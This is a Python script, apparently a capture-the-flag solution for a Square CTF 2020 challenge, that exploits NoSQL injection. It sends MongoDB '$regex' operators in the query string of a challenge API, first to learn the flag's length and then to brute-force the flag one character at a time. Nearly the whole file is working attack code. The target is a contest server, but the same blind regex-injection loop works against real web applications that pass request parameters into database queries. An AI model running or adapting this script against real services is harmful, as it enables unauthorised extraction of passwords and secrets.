
from datetime import datetime
import requests as rq
import os

YELLOW = "\033[1;33m"
RED   = "\033[1;31m"
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"
REVERSE = "\033[;7m"

caractere_liste = ["a","b","c","d",'e',"f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9"]
def flex():
	print("""


	\033[1;31m	       By Zeynn
\033[1;33m
	███╗░░██╗░█████╗░░██████╗░██████╗░██╗░░░░░
	████╗░██║██╔══██╗██╔════╝██╔═══██╗██║░░░░░
	██╔██╗██║██║░░██║╚█████╗░██║██╗██║██║░░░░░
	██║╚████║██║░░██║░╚═══██╗╚██████╔╝██║░░░░░
	██║░╚███║╚█████╔╝██████╔╝░╚═██╔═╝░███████╗
	╚═╝░░╚══╝░╚════╝░╚═════╝░░░░╚═╝░░░╚══════╝
\033[0;32m
		Press enter for start
		""")
	input()
def combiendecaractere(first):
	for i in range(1,40): 
		
		forge= "{.{"+str(i)+"}}"
		data = {"title":"flag","flag":forge}
		
		requete = rq.get("http://challenges.2020.squarectf.com:9542/api/posts?flag[$regex]=flag"+str(forge) , data = data )
		print(YELLOW +"TRY len password : "+str(i))
		end = datetime.now()
		print(CYAN + "Time : "+str(end-first))
		if 'flag' in requete.text:
			print(GREEN + "Requests accept ! " + RESET)
			return i
def brute(taille,first):
	taille = taille
	
	letters = ""
	while taille != 0:
		for i in caractere_liste:
			
			forge= "{"+str(letters) + str(i)+".{"+str(taille-1)+"}}"
			
			data = {"title":"flag","flag":forge}
			
			requete = rq.get("http://challenges.2020.squarectf.com:9542/api/posts?flag[$regex]=flag"+str(forge) , data = data )
			print(YELLOW + "TRY Password :"+str(forge) )
			end = datetime.now()
			print(CYAN + "Time : "+str(end-first))
			if 'flag' in requete.text:
				print(GREEN +"Char find: "+str(i))
				taille -= 1
				letters = str(letters)+str(i)
				if taille == -1:
					return letters



	return letters			


def main():
	os.system("clear")
	flex()
	
	first = datetime.now()
	recup = combiendecaractere(first)
	print(RED + "Len of password : "+ str(recup))
	mot_de_passe = brute(recup,first)
	print(RED + "Password : " +str(mot_de_passe))
	end = datetime.now()
	print(CYAN + "Time : "+str(end-first))

try:
	main()
except KeyboardInterrupt:
	print("")